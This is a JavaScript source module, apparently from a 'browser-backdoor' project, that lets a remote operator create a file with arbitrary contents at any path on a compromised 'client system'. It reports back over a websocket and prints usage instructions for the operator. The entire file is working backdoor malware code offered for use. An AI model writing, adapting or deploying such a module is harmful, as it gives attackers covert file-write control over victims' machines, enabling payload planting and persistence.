// INTERACTIVE
/**
 * @file createFile Module
 * @summary Create a file with specific contents on the client system.
 * @author Carleton Stuberg
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

fs = require('fs');

/**
 * @param {String} fullPath - The full path of the file to create.
 * @param {String} data - The data to write to the file.
 * @return {String} |error|
 * @return {String} "File created"
 */
createFile = function (fullPath, data) {
    fs.writeFile(fullPath, data, function(err) {
        if (err) {
            ws.send("Error: " + err.toString());
            return;
        }
    }); 
    ws.send("File created");
}

ws.send("\nUsage: createFile(fullPath, data)\n- fullPath is the properly escaped full path of the file.\n- data is the text to write to the file.");
